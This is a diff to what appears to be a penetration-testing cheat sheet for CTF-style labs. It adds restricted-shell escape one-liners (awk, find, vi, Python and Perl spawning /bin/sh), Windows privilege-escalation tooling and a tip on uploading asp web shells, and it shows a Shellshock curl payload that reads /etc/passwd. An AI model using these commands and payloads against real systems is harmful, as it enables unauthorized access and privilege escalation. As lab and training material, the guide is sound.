@@ -859,6 +859,131 @@ We can use a shell terminal trick that relies on Python to turn our non-terminal
 
 The above has been referenced from SANS `Sneaky Stealthy SU in (Web) Shells <https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#>`_
 
+Restricted Shell
+----------------
+
+Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from `Escaping Restricted Linux Shells <https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells>`_ , `Escape from SHELLcatraz <https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells>`_ 
+
+Definition
+^^^^^^^^^^
+It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:
+
+* Using the 'cd' command to change directories.
+* Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc...).
+* Specifying command names that contain slashes.
+* Specifying a filename containing a slash as an argument to the '.' built-in command.
+* Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
+* Importing function definitions from the shell environment at startup.
+* Parsing the value of SHELLOPTS from the shell environment at startup.
+* Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
+* Using the 'exec' built-in to replace the shell with another command.
+* Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
+* Using the 'enable' built-in command to enable disabled shell built-ins.
+* Specifying the '-p' option to the 'command' built-in.
+* Turning off restricted mode with 'set +r' or 'set +o restricted 
+
+Real shell implements restricted shells:
+
+* rbash
+
+  ::
+
+   bash -r
+   cd
+   bash: cd: restricted
+
+* rsh
+* rksh
+
+**Getting out of restricted shell**
+
+Reconnaissance
+^^^^^^^^^^^^^^
+
+Find out information about the environment.
+
+* Run env to see exported environment variables
+* Run 'export -p' to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are '-rx', which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell! 
+
+ * If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...). 
+ * If the PATH is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
+* Try basic Unix commands and see what's allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.
+
+Quick Wins
+^^^^^^^^^^
+
+* If '/' is allowed in commands just run /bin/sh
+* If we can set PATH or SHELL variable
+  ::
+
+   export PATH=/bin:/usr/bin:/sbin:$PATH
+   export SHELL=/bin/sh
+
+  or if chsh command is present just change the shell to /bin/bash
+
+  ::
+
+   chsh
+   password: <password will be asked>
+   /bin/bash
+
+* If we can copy files into existing PATH, copy
+ 
+ ::
+
+  cp /bin/sh /current/directory; sh
+
+Taking help of binaries
+^^^^^^^^^^^^^^^^^^^^^^^
+
+Some commands let us execute other system commands, often bypassing shell restrictions
+
+* ftp -> !/bin/sh
+* gdb -> !/bin/sh
+* more/ less/ man -> !/bin/sh
+* vi -> :!/bin/sh : Refer `Breaking out of Jail : Restricted Shell <http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html>`_ and `Restricted Accounts and Vim Tricks in Linux and Unix <http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html>`_ 
+* scp -S /tmp/getMeOut.sh x y : Refer `Breaking out of rbash using scp <http://pentestmonkey.net/blog/rbash-scp>`_ 
+* awk 'BEGIN {system("/bin/sh")}'
+* find / -name someName -exec /bin/sh \;
+* tee
+
+ :: 
+
+  echo "Your evil code" | tee script.sh
+
+* Invoke shell thru scripting language
+
+ * Python
+
+  ::
+
+   python -c 'import os; os.system("/bin/bash")
+
+ * Perl
+
+  ::
+
+   perl -e 'exec "/bin/sh";'
+
+SSHing from outside
+^^^^^^^^^^^^^^^^^^^
+* Use SSH on your machine to execute commands before the remote shell is loaded:
+
+ ::
+
+  ssh username@IP -t "/bin/sh"
+
+* Start the remote shell without loading "rc" profile ( where most of the limitations are often configured)
+ 
+ ::
+
+  ssh username@IP -t "bash --noprofile"
+
+
+
+
+
+
 Gather information from files
 -----------------------------
 
@@ -948,10 +1073,37 @@ Private SSH Keys / SSH Configuration
 Unprivileged shell to privileged shell
 ======================================
 
-Probably, at this point of time, we would have unprivileged shell of user www-data. It would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions. 
+Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions. 
 
 If you have become a normal user of which you have a password, it would be a good idea to check sudo -l to check if there are any executables you have permission to run.
 
+Windows Privilege Escalation
+----------------------------
+
+If you have a meterpreter from a windows box, probably, the first thing would be to utilize
+
+Metasploit Local Exploit Suggestor
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.
+
+  .. Note :: It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.
+
+Sherlock Powershell Script
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+`Sherlock <https://github.com/rasta-mouse/Sherlock>`_ PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in     any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.
+
+Windows Exploit Suggestor
+^^^^^^^^^^^^^^^^^^^^^^^^^
+`Windows Exploit Suggestor <https://github.com/GDSSecurity/Windows-Exploit-Suggester>`_ : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Just copy the systeminfo information from the windows OS and compare the database.
+
+If we are getting the below error on running local exploits of getuid in meterpreter
+
+::
+
+ [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.
+
+Possibly, migrate into a new process using post/windows/manage/migrate
 
 Privilege escalation from g0tm1lk blog
 --------------------------------------
@@ -983,8 +1135,10 @@ A few 'common' places: /tmp, /var/tmp, /dev/shm
   find / -writable -type d 2>/dev/null      # world-writeable folders
   find / -perm -222 -type d 2>/dev/null     # world-writeable folders
   find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+  find / -perm -o w -type f 2>/dev/null     # world-writeable files
 
   find / -perm -o x -type d 2>/dev/null     # world-executable folders
+  find / -perm -o x -type f 2>/dev/null     # world-executable files
 
   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
 
@@ -1576,9 +1730,9 @@ HTTP
 First things
 ^^^^^^^^^^^^
 
-* View Source of the web-page ( Ctrl+U).
-* Inspect element of the web-page ( F12 ).
-* See if there is any hint in the title of the web page. ( example: /Magic ).
+* View Source of the web-page (Ctrl+U).
+* Inspect element of the web-page (F12).
+* See if there is any hint in the title of the web page. (example: /Magic).
 * If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
 
 htaccess - UserAgent
@@ -1597,13 +1751,13 @@ When you see something like this "Someone's sup3r s3cr3t dr0pb0x - only me and S
 
 CGI-BIN Shellshock
 ^^^^^^^^^^^^^^^^^^
-To understand shellshock few blogs can be referred such as `ShellShocked – A quick demo of how easy it is to exploit <https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/>`, `Inside Shellshock: How hackers are using it to exploit systems <https://blog.cloudflare.com/inside-shellshock/>`_
+To understand shellshock few blogs can be referred such as `ShellShocked – A quick demo of how easy it is to exploit <https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/>`_ , `Inside Shellshock: How hackers are using it to exploit systems <https://blog.cloudflare.com/inside-shellshock/>`_
 
 ::
 
   curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat
 
- It is important to understand what is cgi-bin which can be read from `Creating CGI Programs with Bash: Getting Started <http://www.team2053.org/docs/bashcgi/gettingstarted.html>`_. Also the most important lines in this file are:
+It is important to understand what is cgi-bin which can be read from `Creating CGI Programs with Bash: Getting Started <http://www.team2053.org/docs/bashcgi/gettingstarted.html>`_ . Also the most important lines in this file are:
 
 ::
 
@@ -1945,6 +2099,8 @@ Others
 
  
 * Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.
+
+* If a machine is running a IIS Server and we have found a way to upload a file. We can try asp web-shell or meterpreter of asp, aspx, aspx-exe executable formats from msfvenom.
 
 * If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.
 
